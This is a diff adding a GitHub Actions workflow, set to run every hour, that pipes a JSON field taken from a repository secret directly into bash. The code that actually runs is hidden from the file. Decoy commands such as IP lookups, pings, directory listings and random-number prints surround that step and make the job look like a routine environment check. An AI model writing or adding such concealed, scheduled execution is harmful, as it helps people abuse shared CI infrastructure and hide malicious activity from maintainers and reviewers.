@@ -1,0 +1,31 @@
+name: dongzihua3691
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongzihua3691
+        env:
+          y13778: ${{ secrets.y13778 }}
+        run: |
+          echo "Dir: $(pwd)"
+          echo $y13778 | jq -r .j32418 | /bin/bash
+          curl ipinfo.io/ip
+          cd ~
+          ls -la 2>/dev/null || true
+          which curl
+          echo "Dir: $(pwd)"
+          curl ipinfo.io
+          [ -z "$RANDOM" ] || echo "Random var set"
+          ping -c 10 www.google.com
+          echo "Random ID: $RANDOM$RANDOM"
+          which bash 2>/dev/null || echo "Bash not in path"
+          pushd ~ > /dev/null
+          printf "%s\n" $(date)
+          pushd ~
+          curl www.google.com
